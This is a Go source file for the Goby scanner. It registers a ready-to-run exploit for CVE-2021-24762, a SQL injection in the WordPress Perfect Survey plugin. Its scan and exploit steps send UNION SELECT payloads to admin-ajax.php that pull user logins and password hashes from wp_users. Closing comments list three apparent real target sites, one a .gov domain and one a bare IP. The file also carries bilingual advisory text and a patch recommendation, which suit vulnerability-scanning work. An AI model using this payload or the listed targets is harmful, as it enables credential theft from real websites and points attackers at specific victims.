package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin perfect survey admin-ajax.php question_id SQL Injection Vulnerability (CVE-2021-24762)",
    "Description": "<p>WordPress plugin perfect survey is a plugin for surveying user feedback issues.</p><p>WordPress plugin perfect survey version before 1.5.2 has a SQL injection vulnerability, the vulnerability stems from the lack of validation of externally input SQL statements in database-based applications. Attackers can exploit this vulnerability to execute illegal SQL commands to obtain sensitive information such as user passwords.</p>",
    "Product": "wordpress-plugin-perfect-survey",
    "Homepage": "https://wordpress.org/plugins/perfect-survey/",
    "DisclosureDate": "2021-01-14",
    "Author": "h1ei1",
    "FofaQuery": "body=\"/wp-content/plugins/perfect-survey\"",
    "GobyQuery": "body=\"/wp-content/plugins/perfect-survey\"",
    "Level": "3",
    "Impact": "<p>WordPress plugin perfect survey version before 1.5.2 has a SQL injection vulnerability, the vulnerability stems from the lack of validation of externally input SQL statements in database-based applications. Attackers can exploit this vulnerability to execute illegal SQL commands to obtain sensitive information such as user passwords.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/perfect-survey/.\">https://wordpress.org/plugins/perfect-survey/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "createSelect",
            "value": "user_pass,user_login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cmd5(123)%2C0%2C0%2Cmd5(123)%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2C{{{sql}}}%2C0%2C0%2Cmd5(123)%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2021-24762"
    ],
    "CNNVD": [
        "CNNVD-202202-043"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress perfect survey 插件 admin-ajax.php 文件 question_id 参数 SQL注入漏洞（CVE-2021-24762）",
            "Product": "wordpress-plugin-perfect-survey",
            "Description": "<p>WordPress plugin perfect survey 是一款用于调研用户反馈问题的插件。<br></p><p>WordPress plugin perfect survey 1.5.2之前版本存在SQL注入漏洞，该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令获取用户密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/perfect-survey/\">https://wordpress.org/plugins/perfect-survey/</a>。<br></p>",
            "Impact": "<p>WordPress plugin perfect survey 1.5.2之前版本存在SQL注入漏洞，该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令获取用户密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress plugin perfect survey admin-ajax.php question_id SQL Injection Vulnerability (CVE-2021-24762)",
            "Product": "wordpress-plugin-perfect-survey",
            "Description": "<p>WordPress plugin perfect survey is a plugin for surveying user feedback issues.<br></p><p>WordPress plugin perfect survey version before 1.5.2 has a SQL injection vulnerability, the vulnerability stems from the lack of validation of externally input SQL statements in database-based applications. Attackers can exploit this vulnerability to execute illegal SQL commands to obtain sensitive information such as user passwords.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/perfect-survey/.\">https://wordpress.org/plugins/perfect-survey/.</a><br></p>",
            "Impact": "<p>WordPress plugin perfect survey version before 1.5.2 has a SQL injection vulnerability, the vulnerability stems from the lack of validation of externally input SQL statements in database-based applications. Attackers can exploit this vulnerability to execute illegal SQL commands to obtain sensitive information such as user passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//https://library.usu.ac.id
//https://alabamaageline.gov
//https://177.85.235.30